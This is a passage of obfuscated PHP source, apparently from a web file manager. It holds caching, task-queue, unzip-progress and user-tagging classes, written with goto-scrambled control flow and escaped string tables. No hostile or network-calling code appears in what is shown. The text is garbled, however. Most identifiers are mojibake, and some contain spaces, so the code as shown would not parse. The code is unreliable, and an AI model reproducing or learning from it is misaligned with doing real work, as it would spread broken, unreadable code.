$A†øÚ‡‰Œ³, $_SERVER[±á õÁ][772] => $b½·ÆÃ½÷, $_SERVER[±á õÁ][764] => $A¶¥è¡¡áÃ, $_SERVER[±á õÁ][763] => $eôºœ·Äì–); if ($E´Æ§¦Ïô¤) { $bÁâÒ¿µé[$_SERVER[±á õÁ][773]] = $cŒ‘¶ùªŠí; $bÁâÒ¿µé[$_SERVER[±á õÁ][774]] = $B‡Úµ†çµ²; } goto b’ÑŒ¸‚ë©; dëŒßóùé: $a£âÆæö„ = Backup::get(); $b½·ÆÃ½÷ = $a£âÆæö„[$_SERVER[±á õÁ][296]][$_SERVER[±á õÁ][181]][$_SERVER[±á õÁ][443]]; $c¢¬œğçÓœ = array($_SERVER[±á õÁ][444] => array($_SERVER[±á õÁ][759], $b½·ÆÃ½÷), $_SERVER[±á õÁ][760] => array($_SERVER[±á õÁ][334], $a£âÆæö„[$_SERVER[±á õÁ][716]])); goto Dƒ†±¢¯ä; AÜÚŸæˆ‰: $eäåšˆÆÙÓ = !0; $FäÓÍ–¨Äë = $this->storeIds(); $Fâ›Ì”°• = 1; goto Bã“Š×‹Æ‰; FëÕØ¨‘„Œ: } private function _fileExist($f’™ÂÛÌÄ·, &$aÊÎ±«‰Š, $Bä¶È‰ç˜) { goto E£Á‰ïšğ‘; böã‹ì£Ÿ: if (IO::exist($F„¤àĞù™)) { $aÊÎ±«‰Š[] = $f’™ÂÛÌÄ·[$aô˜İßè²Ä[443]]; return !1; } $dÇöêµòë¥ = array($aô˜İßè²Ä[768] => $f’™ÂÛÌÄ·[$aô˜İßè²Ä[768]], $aô˜İßè²Ä[85] => array($aô˜İßè²Ä[381], "{$F„¤àĞù™}\45")); $FÆ÷«Ôë = Model($aô˜İßè²Ä[743])->where($dÇöêµòë¥)->field($aô˜İßè²Ä[444])->select(); goto bŞîœÏÃÑ¦; C¿›âëÀ‰Ì: if (!in_array($f’™ÂÛÌÄ·[$aô˜İßè²Ä[768]], $Bä¶È‰ç˜)) { return !1; } if (IO::exist($bµø¦îí’)) { return !0; } $F„¤àĞù™ = get_path_father($bµø¦îí’); goto böã‹ì£Ÿ; E£Á‰ïšğ‘: $aô˜İßè²Ä =& $_SERVER[±á õÁ]; $bµø¦îí’ = $f’™ÂÛÌÄ·[$aô˜İßè²Ä[85]]; if (in_array($f’™ÂÛÌÄ·[$aô˜İßè²Ä[443]], $aÊÎ±«‰Š)) { return !1; } goto C¿›âëÀ‰Ì; bŞîœÏÃÑ¦: $aÊÎ±«‰Š = array_merge($aÊÎ±«‰Š, array_to_keyvalue($FÆ÷«Ôë, $aô˜İßè²Ä[43], $aô˜İßè²Ä[443])); return !1; goto CÓ„âáğ¸À; CÓ„âáğ¸À: } private function _fileFilter($e¸Õˆ§Á´ô) { $b¶‹¢¸´´À =& $_SERVER[±á õÁ]; if (empty($e¸Õˆ§Á´ô)) { return; } $f‰‡‹ãê§ = array($b¶‹¢¸´´À[443] => array($b¶‹¢¸´´À[7], array_unique($e¸Õˆ§Á´ô))); $AÑĞòæô = Model($b¶‹¢¸´´À[776])->where($f‰‡‹ãê§)->field($b¶‹¢¸´´À[393])->select(); foreach ($AÑĞòæô as $Bèé­ĞÛ¾ê) { Model($b¶‹¢¸´´À[776])->remove($Bèé­ĞÛ¾ê[$b¶‹¢¸´´À[393]], !1); } } private function storeIds() { $b‰™Õ’ŠÀ =& $_SERVER[±á õÁ]; $FœğŠ²¨¾¦ = Model($b‰™Õ’ŠÀ[728])->listData(); $cöí›­ÊÆ = array(); $F’–øÃ“® = $GLOBALS[$b‰™Õ’ŠÀ[6]][$b‰™Õ’ŠÀ[94]][$b‰™Õ’ŠÀ[777]]; foreach ($FœğŠ²¨¾¦ as $DÍ¯í¯ÔŸÊ) { $bãÆ‚„Ê = strtolower($DÍ¯í¯ÔŸÊ[$b‰™Õ’ŠÀ[100]]); if (!isset($F’–øÃ“®[$bãÆ‚„Ê])) { continue; } $FÈçÖÇŸâ = $b‰™Õ’ŠÀ[81] . (isset($F’–øÃ“®[$bãÆ‚„Ê]) ? $F’–øÃ“®[$bãÆ‚„Ê] : ucfirst($bãÆ‚„Ê)); if (!class_exists($FÈçÖÇŸâ)) { continue; } $cöí›­ÊÆ[] = $DÍ¯í¯ÔŸÊ[$b‰™Õ’ŠÀ[391]]; } return $cöí›­ÊÆ; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto Eİ–ŸÙ®î¥; Eİ–ŸÙ®î¥: $Eá…‡‰ŞÛì =& $_SERVER[±á õÁ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto c—¼‡Æá˜; e˜Ÿ¦®¡…: switch ($EêÜˆÚ’…Ñ[$Eá…‡‰ŞÛì[778]]) { case $Eá…‡‰ŞÛì[27]: self::$handle = Model($Eá…‡‰ŞÛì[780]); break; case $Eá…‡‰ŞÛì[781]: self::$handle = new CacheRedis($c¢ŠÌ¦È×Š, $eåîì÷¶˜); break; case $Eá…‡‰ŞÛì[782]: self::$handle = new CacheMemcached($c¢ŠÌ¦È×Š, $eåîì÷¶˜); break; case $Eá…‡‰ŞÛì[181]: self::$handle = new CacheFile($c¢ŠÌ¦È×Š, $eåîì÷¶˜); break; default: break; } return self::$handle; goto bíˆÇ®ê; c—¼‡Æá˜: $EêÜˆÚ’…Ñ = $GLOBALS[$Eá…‡‰ŞÛì[6]][$Eá…‡‰ŞÛì[352]]; $c¢ŠÌ¦È×Š = $EêÜˆÚ’…Ñ[$EêÜˆÚ’…Ñ[$Eá…‡‰ŞÛì[778]]]; $eåîì÷¶˜ = $EêÜˆÚ’…Ñ[$Eá…‡‰ŞÛì[779]]; goto e˜Ÿ¦®¡…; bíˆÇ®ê: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($D½•ŠÂ¾‹´) { if (is_array($D½•ŠÂ¾‹´) || is_object($D½•ŠÂ¾‹´)) { $D½•ŠÂ¾‹´ = json_encode($D½•ŠÂ¾‹´); } $D½•ŠÂ¾‹´ = rawurlencode($D½•ŠÂ¾‹´); return md5(KOD_SITE_ID . $_SERVER[±á õÁ][80] . $D½•ŠÂ¾‹´); } public static function get($D¾Ø â¬Î) { $cÊÏºÂŸÅì = self::key($D¾Ø â¬Î); if (!isset(self::$memoryCache[$cÊÏºÂŸÅì])) { $B¢ÆŠ„äòÚ = self::init()->get($cÊÏºÂŸÅì); self::$memoryCache[$cÊÏºÂŸÅì] = unserialize($B¢ÆŠ„äòÚ); } return self::$memoryCache[$cÊÏºÂŸÅì]; } public static function set($bˆàÍ¹¹£¦, $FêË¥¬ÕÏÙ, $a÷ËçÛ‹¼Ö = false) { goto aÎòÔ˜Åì; d†¶íé’‚Ú: CacheLock::unlock($bˆàÍ¹¹£¦); return $a˜ôõ´ø”÷; goto E§ƒîÓ÷ˆ¨; B‘Ô¬ƒµíœ: CacheLock::lock($bˆàÍ¹¹£¦); $a˜ôõ´ø”÷ = self::init()->set($FíÂ´ÊŞÌÎ, serialize($FêË¥¬ÕÏÙ), $a÷ËçÛ‹¼Ö); self::$memoryCache[$FíÂ´ÊŞÌÎ] = $FêË¥¬ÕÏÙ; goto d†¶íé’‚Ú; aÎòÔ˜Åì: $FíÂ´ÊŞÌÎ = self::key($bˆàÍ¹¹£¦); if (isset(self::$memoryCache[$FíÂ´ÊŞÌÎ]) && self::$memoryCache[$FíÂ´ÊŞÌÎ] === $FêË¥¬ÕÏÙ) { return !0; } if ($a÷ËçÛ‹¼Ö === 0) { self::$memoryCache[$FíÂ´ÊŞÌÎ] = $FêË¥¬ÕÏÙ; return !0; } goto B‘Ô¬ƒµíœ; E§ƒîÓ÷ˆ¨: } public static function remove($C‹êíŠ‰©Õ) { goto aÍå¬ô°¡; aâÉ¼‘²‚¸: CacheLock::lock($C‹êíŠ‰©Õ); $F–ª”Âæ‘ª = self::init()->remove($a‹ÙµèÂ¸); CacheLock::unlock($C‹êíŠ‰©Õ); goto B ‰»‘áò¿; B ‰»‘áò¿: return $F–ª”Âæ‘ª; goto Bø÷ºÖíòÓ; aÍå¬ô°¡: $a‹ÙµèÂ¸ = self::key($C‹êíŠ‰©Õ); unset(self::$memoryCache[$a‹ÙµèÂ¸]); self::clearTimeout(); goto aâÉ¼‘²‚¸; Bø÷ºÖíòÓ: } public static function removeMemory($FœÎ‡ÕõŞ©) { $e ñÍìÕË = self::key($FœÎ‡ÕõŞ©); unset(self::$memoryCache[$e ñÍìÕË]); } public static function clearMemory($BğÎ¡‚Óß÷ = false) { if ($BğÎ¡‚Óß÷) { $BğÎ¡‚Óß÷ = self::key($BğÎ¡‚Óß÷); unset(self::$memoryCache[$BğÎ¡‚Óß÷]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[±á õÁ][783])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[±á õÁ][784])) { self::init()->clearTimeout(); } } } goto d¨óó„¯é¤; E‰…¤ƒ¤›: class TaskHttp extends Task { protected function startAfter() { $b¦”¸’Ö˜‘ =& $_SERVER[±á õÁ]; $DÆö³‚‘™Ğ =& $this->task; $DÆö³‚‘™Ğ[$b¦”¸’Ö˜‘[1527]] = 1; Hook::bind($b¦”¸’Ö˜‘[1500], array($this, $b¦”¸’Ö˜‘[1528])); Hook::bind($b¦”¸’Ö˜‘[1502], array($this, $b¦”¸’Ö˜‘[1529])); Hook::bind($b¦”¸’Ö˜‘[1504], array($this, $b¦”¸’Ö˜‘[1530])); } protected function endAfter() { $D›¥‰á´¯í =& $_SERVER[±á õÁ]; Hook::unbind($D›¥‰á´¯í[1500], array($this, $D›¥‰á´¯í[1528])); Hook::unbind($D›¥‰á´¯í[1502], array($this, $D›¥‰á´¯í[1529])); Hook::unbind($D›¥‰á´¯í[1504], array($this, $D›¥‰á´¯í[1530])); } public function progressStart($Fƒ©Àš×à) { $FÎöœ»…½Œ =& $_SERVER[±á õÁ]; $Díµ‹šÄâÌ = curl_getinfo($Fƒ©Àš×à); self::log($FÎöœ»…½Œ[1531] . $Díµ‹šÄâÌ[$FÎöœ»…½Œ[310]]); self::valueSet($this->task[$FÎöœ»…½Œ[391]], $this->task); } public function progressEnd($D•×™‹‘) { $A…È¹˜œ™± =& $_SERVER[±á õÁ]; self::log($A…È¹˜œ™±[1532] . $this->task[$A…È¹˜œ™±[391]]); $this->end(); } public function progress($còÔÕöªÅ†, $Aó«ï‹‡Ã‹, $AÊáª³Ğòä, $A¯ÛƒäÜ, $C‰ºŞ›ñ‹) { $e¬‘ì’Ôç =& $_SERVER[±á õÁ]; $aâÂ„…É¿ =& $this->task; if ($C‰ºŞ›ñ‹ > 0) { $aâÂ„…É¿[$e¬‘ì’Ôç[994]] = $aâÂ„…É¿[$e¬‘ì’Ôç[994]] == 0 ? $A¯ÛƒäÜ : $aâÂ„…É¿[$e¬‘ì’Ôç[994]]; $aâÂ„…É¿[$e¬‘ì’Ôç[1008]] = $C‰ºŞ›ñ‹; } else { if ($AÊáª³Ğòä > 0) { $aâÂ„…É¿[$e¬‘ì’Ôç[994]] = $aâÂ„…É¿[$e¬‘ì’Ôç[994]] == 0 ? $Aó«ï‹‡Ã‹ : $aâÂ„…É¿[$e¬‘ì’Ôç[994]]; $aâÂ„…É¿[$e¬‘ì’Ôç[1008]] = $AÊáª³Ğòä; } } $this->update(); self::log("\160\162\157\147\162\145\163\163\x48\x74\164\160\x3a\x64\157\x77\x6e\x3a{$AÊáª³Ğòä}\57{$Aó«ï‹‡Ã‹}\x3b\40\x75\160\154\157\141\x64\72{$C‰ºŞ›ñ‹}\x2f{$A¯ÛƒäÜ}\x3b"); } } class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\164\141\x73\x6b\121\x75\x65\x75\145\114\x65\x6e\x67\164\150"; const QUEUE_DATA = "\x74\141\x73\153\x51\x75\x65\x75\x65\x44\141\x74\x61"; public static function initTask() { } public static function add($eåæ±êñõŸ, $C«Ã¯ÁÖ²è = array(), $Bš¹´Ÿ‚» = '', $eÛ’‰¡·¿Û = '') { goto f˜Œ˜Èºò; f˜Œ˜Èºò: $CÇ¥õ«èÌ´ =& $_SERVER[±á õÁ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $E„‚öó¸–ä = self::getAll(); goto FÊŠĞ«®‚¤; bÅÇÙ½·Å: self::setAll($E„‚öó¸–ä); return !0; goto f´‚éì—çé; FÊŠĞ«®‚¤: if ($eÛ’‰¡·¿Û && array_find_by_field($E„‚öó¸–ä, $CÇ¥õ«èÌ´[99], $eÛ’‰¡·¿Û)) { return !0; } $E„‚öó¸–ä[] = array($CÇ¥õ«èÌ´[267] => $eåæ±êñõŸ, $CÇ¥õ«èÌ´[1533] => $C«Ã¯ÁÖ²è, $CÇ¥õ«èÌ´[429] => $Bš¹´Ÿ‚», $CÇ¥õ«èÌ´[99] => $eÛ’‰¡·¿Û); write_log($CÇ¥õ«èÌ´[1534] . $Bš¹´Ÿ‚», $CÇ¥õ«èÌ´[1535]); goto bÅÇÙ½·Å; f´‚éì—çé: } public static function run() { goto F¦¤ÒƒÈ¶; AÙëŞµóã½: if (!$f‹…ÇÆ›Ïğ) { return !1; } self::setAll($c¡Ì åÁ„™); write_log($B†½•àÕ»[1536] . $f‹…ÇÆ›Ïğ[$B†½•àÕ»[429]], $B†½•àÕ»[1535]); goto cë°µÊƒ¶; cë°µÊƒ¶: try { $fİ˜¸¥¡»– = Hook::apply($f‹…ÇÆ›Ïğ[$B†½•àÕ»[267]], $f‹…ÇÆ›Ïğ[$B†½•àÕ»[1533]]); } catch (Exception $C‚öâÓêİŒ) { } write_log($B†½•àÕ»[1537] . $f‹…ÇÆ›Ïğ[$B†½•àÕ»[429]], $B†½•àÕ»[1535]); return !0; goto c•ê»œÈèÔ; F¦¤ÒƒÈ¶: $B†½•àÕ» =& $_SERVER[±á õÁ]; $c¡Ì åÁ„™ = self::getAll(); $f‹…ÇÆ›Ïğ = array_shift($c¡Ì åÁ„™); goto AÙëŞµóã½; c•ê»œÈèÔ: } public static function count() { $bòİ·Çº = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$bòİ·Çº) { return 0; } return intval($bòİ·Çº); } public static function getAll() { $C…„¦²İä = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$C…„¦²İä) { return array(); } return $C…„¦²İä; } public static function setAll($c¼÷±Â˜) { $C½Ô‘Œ‡ÄÔ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($c¼÷±Â˜), $C½Ô‘Œ‡ÄÔ); Cache::set(self::QUEUE_DATA, $c¼÷±Â˜, $C½Ô‘Œ‡ÄÔ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto F¡Á®‘ÃÒ; F¡Á®‘ÃÒ: $f²ØôÛÕæ‘ =& $_SERVER[±á õÁ]; parent::startAfter(); Hook::bind($f²ØôÛÕæ‘[1538], array($this, $f²ØôÛÕæ‘[1539])); goto eËƒØÖ‚àµ; eËƒØÖ‚àµ: Hook::bind($f²ØôÛÕæ‘[1057], array($this, $f²ØôÛÕæ‘[1540])); $FŸïÒã¤Àö =& $this->task; $FŸïÒã¤Àö[$f²ØôÛÕæ‘[1541]] = $f²ØôÛÕæ‘[1062]; goto e…àÍãï; e…àÍãï: if (!$FŸïÒã¤Àö[$f²ØôÛÕæ‘[1366]]) { $FŸïÒã¤Àö[$f²ØôÛÕæ‘[1366]] = LNG($f²ØôÛÕæ‘[1542]); } goto BŸ¹ˆ«Œ™ª; BŸ¹ˆ«Œ™ª: } protected function endAfter() { $a¿èÅƒˆ§³ =& $_SERVER[±á õÁ]; parent::endAfter(); Hook::unbind($a¿èÅƒˆ§³[1538], array($this, $a¿èÅƒˆ§³[1539])); Hook::unbind($a¿èÅƒˆ§³[1057], array($this, $a¿èÅƒˆ§³[1540])); } public function updateAfter() { $c¡ì½èš =& $_SERVER[±á õÁ]; $CªŞëÈ™‹† =& $this->task; if (!$CªŞëÈ™‹†[$c¡ì½èš[994]] || !$CªŞëÈ™‹†[$c¡ì½èš[723]]) { return; } if ($CªŞëÈ™‹†[$c¡ì½èš[1541]] == $c¡ì½èš[1062]) { $E¨ôÀ…Ì¹ = 0; if ($CªŞëÈ™‹†[$c¡ì½èš[1508]]) { $E¨ôÀ…Ì¹ = $CªŞëÈ™‹†[$c¡ì½èš[1509]] / $CªŞëÈ™‹†[$c¡ì½èš[1508]]; } $CªŞëÈ™‹†[$c¡ì½èš[1464]] = $E¨ôÀ…Ì¹ * 0.3; } else { if ($CªŞëÈ™‹†[$c¡ì½èš[1541]] == $c¡ì½èš[316]) { $E¨ôÀ…Ì¹ = $CªŞëÈ™‹†[$c¡ì½èš[1008]] / $CªŞëÈ™‹†[$c¡ì½èš[994]]; $CªŞëÈ™‹†[$c¡ì½èš[1464]] = 0.3 + $E¨ôÀ…Ì¹ * 0.4; } else { if ($CªŞëÈ™‹†[$c¡ì½èš[1541]] == $c¡ì½èš[113]) { $cÇ±†‡¹Ü = 0; if ($CªŞëÈ™‹†[$c¡ì½èš[1510]] == $c¡ì½èš[113]) { $cÇ±†‡¹Ü = $CªŞëÈ™‹†[$c¡ì½èš[1509]]; } $E¨ôÀ…Ì¹ = ($CªŞëÈ™‹†[$c¡ì½èš[1513]] + $cÇ±†‡¹Ü) / $CªŞëÈ™‹†[$c¡ì½èš[723]]; $CªŞëÈ™‹†[$c¡ì½èš[1464]] = 0.3 + 0.4 + $E¨ôÀ…Ì¹ * 0.3; } } } if ($CªŞëÈ™‹†[$c¡ì½èš[1464]] > 0) { $DùÉÜ±Ó‡ = timeFloat() - $CªŞëÈ™‹†[$c¡ì½èš[1466]] - $CªŞëÈ™‹†[$c¡ì½èš[1469]]; $CªŞëÈ™‹†[$c¡ì½èš[1470]] = $DùÉÜ±Ó‡ * (1 - $CªŞëÈ™‹†[$c¡ì½èš[1464]]) / $CªŞëÈ™‹†[$c¡ì½èš[1464]]; } } public function addFile($eË•ÈÈ¿“Š) { goto D´âåÃÅ; D´âåÃÅ: $f¿Ü¼çº¨é =& $_SERVER[±á õÁ]; $cˆˆâÙ¸Â =& $this->task; $Dà»äŠ“Ü = IO::info($eË•ÈÈ¿“Š); goto fğĞà³ìé†; AÕëšÌ‚Ëê: $this->update(); goto dÕ¾ê‘‰ÊÜ; eõõçÉôé“: $cˆˆâÙ¸Â[$f¿Ü¼çº¨é[996]] = $f¿Ü¼çº¨é[1525]; $cˆˆâÙ¸Â[$f¿Ü¼çº¨é[1510]] = $f¿Ü¼çº¨é[1062]; $cˆˆâÙ¸Â[$f¿Ü¼çº¨é[723]] = $Dà»äŠ“Ü[$f¿Ü¼çº¨é[87]]; goto BØ¬¼©Œ; fğĞà³ìé†: $cˆˆâÙ¸Â[$f¿Ü¼çº¨é[1506]] = $Dà»äŠ“Ü[$f¿Ü¼çº¨é[38]]; $cˆˆâÙ¸Â[$f¿Ü¼çº¨é[1508]] = $Dà»äŠ“Ü[$f¿Ü¼çº¨é[87]]; $cˆˆâÙ¸Â[$f¿Ü¼çº¨é[1509]] = 0; goto eõõçÉôé“; BØ¬¼©Œ: $cˆˆâÙ¸Â[$f¿Ü¼çº¨é[994]] = 1; $F£ƒœã„èÇ = 0; $cˆˆâÙ¸Â[$f¿Ü¼çº¨é[1517]] = array($f¿Ü¼çº¨é[1518] => $F£ƒœã„èÇ + 1, $f¿Ü¼çº¨é[410] => $Dà»äŠ“Ü[$f¿Ü¼çº¨é[38]], $f¿Ü¼çº¨é[85] => $Dà»äŠ“Ü[$f¿Ü¼çº¨é[85]], $f¿Ü¼çº¨é[491] => $Dà»äŠ“Ü[$f¿Ü¼çº¨é[491]] ? $Dà»äŠ“Ü[$f¿Ü¼çº¨é[491]] : $Dà»äŠ“Ü[$f¿Ü¼çº¨é[85]]); goto AÕëšÌ‚Ëê; dÕ¾ê‘‰ÊÜ: } public function unzipAfter($A»ÅÑ™³İÖ) { goto eé‚’‚’ª¢; eé‚’‚’ª¢: $bìí†ÌÄ¡æ =& $_SERVER[±á õÁ]; $Cµ´‹åĞ°• =& $this->task; $Cµ´‹åĞ°•[$bìí†ÌÄ¡æ[1541]] = $bìí†ÌÄ¡æ[113]; goto A¶Ğ÷Ù«À‚; aººß”˜ÁÏ: $Cµ´‹åĞ°•[$bìí†ÌÄ¡æ[1506]] = $bìí†ÌÄ¡æ[43]; $Cµ´‹åĞ°•[$bìí†ÌÄ¡æ[1513]] = 0; $Cµ´‹åĞ°•[$bìí†ÌÄ¡æ[723]] = $f‘ÌÈßëŒá[$bìí†ÌÄ¡æ[87]]; goto A½ô”†Î˜Ò; A½ô”†Î˜Ò: $this->update(); self::log($bìí†ÌÄ¡æ[1543] . json_encode(array($Cµ´‹åĞ°•, $f‘ÌÈßëŒá))); goto f¾°ì±Ùç³; DºÅŸªòéô: $Cµ´‹åĞ°•[$bìí†ÌÄ¡æ[1008]] = 0; $Cµ´‹åĞ°•[$bìí†ÌÄ¡æ[1508]] = 0; $Cµ´‹åĞ°•[$bìí†ÌÄ¡æ[1509]] = 0; goto aººß”˜ÁÏ; e×†’Ëñİ¤: if ($f‘ÌÈßëŒá[$bìí†ÌÄ¡æ[39]] == $bìí†ÌÄ¡æ[181]) { $Cµ´‹åĞ°•[$bìí†ÌÄ¡æ[994]] = 1; } else { $Cµ´‹åĞ°•[$bìí†ÌÄ¡æ[994]] = $f‘ÌÈßëŒá[$bìí†ÌÄ¡æ[90]][$bìí†ÌÄ¡æ[88]]; } $Cµ´‹åĞ°•[$bìí†ÌÄ¡æ[996]] = $bìí†ÌÄ¡æ[43]; $Cµ´‹åĞ°•[$bìí†ÌÄ¡æ[1510]] = 0; goto DºÅŸªòéô; A¶Ğ÷Ù«À‚: $f‘ÌÈßëŒá = IO::infoWithChildren($A»ÅÑ™³İÖ); $c®ÍÃ®Ÿ¾ó = 0; $Cµ´‹åĞ°•[$bìí†ÌÄ¡æ[1517]] = array($bìí†ÌÄ¡æ[1518] => $c®ÍÃ®Ÿ¾ó + 1, $bìí†ÌÄ¡æ[410] => $f‘ÌÈßëŒá[$bìí†ÌÄ¡æ[38]], $bìí†ÌÄ¡æ[85] => $f‘ÌÈßëŒá[$bìí†ÌÄ¡æ[85]], $bìí†ÌÄ¡æ[491] => $f‘ÌÈßëŒá[$bìí†ÌÄ¡æ[491]] ? $f‘ÌÈßëŒá[$bìí†ÌÄ¡æ[491]] : $f‘ÌÈßëŒá[$bìí†ÌÄ¡æ[85]]); goto e×†’Ëñİ¤; f¾°ì±Ùç³: } public function nameParse($bÎô‰ğ†©†) { goto cÖÙÁ¨Û; Aå’ÂáëÃ¯: $this->update(); goto AŸ¨¢±÷íÊ; cÖÙÁ¨Û: $båÙ“İ¶ … =& $_SERVER[±á õÁ]; $EÄÚ©õéô =& $this->task; if ($EÄÚ©õéô[$båÙ“İ¶ …[1541]] == $båÙ“İ¶ …[1062]) { $EÄÚ©õéô[$båÙ“İ¶ …[1541]] = $båÙ“İ¶ …[316]; $EÄÚ©õéô[$båÙ“İ¶ …[1513]] = 0; $EÄÚ©õéô[$båÙ“İ¶ …[723]] = 0; } goto B¦ ™Úù†Æ; B¦ ™Úù†Æ: $bä«ƒºËí = get_path_this($bÎô‰ğ†©†); if (strstr($bä«ƒºËí, $båÙ“İ¶ …[101])) { $EÄÚ©õéô[$båÙ“İ¶ …[1008]] += 1; $EÄÚ©õéô[$båÙ“İ¶ …[994]] += 1; } $EÄÚ©õéô[$båÙ“İ¶ …[1506]] = $bÎô‰ğ†©†; goto Aå’ÂáëÃ¯; AŸ¨¢±÷íÊ: } } goto B¼®×ØåÕ; bšÓ†Ë‰ÌÚ: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\x72\x5f\x66\x61\166"; protected function cacheFunctionAlias($Bí‹ƒŠÆï) { $c÷éº¾ƒ¼ö =& $_SERVER[±á õÁ]; return array($c÷éº¾ƒ¼ö[1719] => array(USER_ID, $c÷éº¾ƒ¼ö[1720])); } protected function listData() { $c‘±¡Âá‹à =& $_SERVER[±á õÁ]; $FÂÙ‹ŒÁï¯ = array($c‘±¡Âá‹à[1455] => USER_ID, $c‘±¡Âá‹à[459] => array($c‘±¡Âá‹à[1723], 0)); $EñÖšã§à© = $c‘±¡Âá‹à[1725]; $AÎĞ´Ñ¡¯î = $this->field($EñÖšã§à©)->where($FÂÙ‹ŒÁï¯)->order($c‘±¡Âá‹à[1726])->select(); return $AÎĞ´Ñ¡¯î ? $AÎĞ´Ñ¡¯î : array(); } protected function listByTag($aÍñ¤…É‰×) { } protected function addToTag($C¯œìÓ·à , $fÆ¨áô‘–Ã) { $c¬ªÆÁ’”ê =& $_SERVER[±á õÁ]; if (!Model($c¬ªÆÁ’”ê[1864])->listData($fÆ¨áô‘–Ã) || !Model($c¬ªÆÁ’”ê[776])->pathInfo($C¯œìÓ·à )) { return !1; } $d¤‰Æ¤¾• = array($c¬ªÆÁ’”ê[1455] => USER_ID, $c¬ªÆÁ’”ê[459] => $fÆ¨áô‘–Ã, $c¬ªÆÁ’”ê[411] => $C¯œìÓ·à , $c¬ªÆÁ’”ê[412] => $c¬ªÆÁ’”ê[406], $c¬ªÆÁ’”ê[410] => $c¬ªÆÁ’”ê[43], $c¬ªÆÁ’”ê[1625] => 0); if ($this->where($d¤‰Æ¤¾•)->find()) { return !1; } return $this->add($d¤‰Æ¤¾•); } protected function removeFromTag($bƒŠ‹ŞÈïÁ, $E´µ¦ˆ‹Û) { $FÏğİ»”™’ =& $_SERVER[±á õÁ]; if (!Model($FÏğİ»”™’[1864])->listData($E´µ¦ˆ‹Û)) { return !1; } if (is_array($bƒŠ‹ŞÈïÁ)) { $bƒŠ‹ŞÈïÁ = array($FÏğİ»”™’[7], $bƒŠ‹ŞÈïÁ); } $f¿ë¾©¿¡‘ = array($FÏğİ»”™’[1455] => USER_ID, $FÏğİ»”™’[459] => $E´µ¦ˆ‹Û, $FÏğİ»”™’[412] => $FÏğİ»”™’[406], $FÏğİ»”™’[411] => $bƒŠ‹ŞÈïÁ); return $this->where($f¿ë¾©¿¡‘)->delete(); } protected function removeByTag($eé†ÜˆËãù) { $e´—‘¤ÅÉ =& $_SERVER[±á õÁ]; if (!$eé†ÜˆËãù) { return !1; } $AŸÆ¶òÌïœ = array($e´—‘¤ÅÉ[1455] => USER_ID, $e´—‘¤ÅÉ[459] => $eé†ÜˆËãù); return $this->where($AŸÆ¶òÌïœ)->delete(); } protected function removeBySource($B¸ŞˆÛ—å) { $c¡ö£…Øš“ =& $_SERVER[±á õÁ]; if (is_array($B¸ŞˆÛ—å)) { $B¸ŞˆÛ—å = array($c¡ö£…Øš“[7], $B¸ŞˆÛ—å); } $AáÆ‹ÕÔ–¦ = array($c¡ö£…Øš“[1455] => USER_ID, $c¡ö£…Øš“[411] => $B¸ŞˆÛ—å, $c¡ö£…Øš“[459] => array($c¡ö£…Øš“[944], 0)); return $this->where($AáÆ‹ÕÔ–¦)->delete(); } }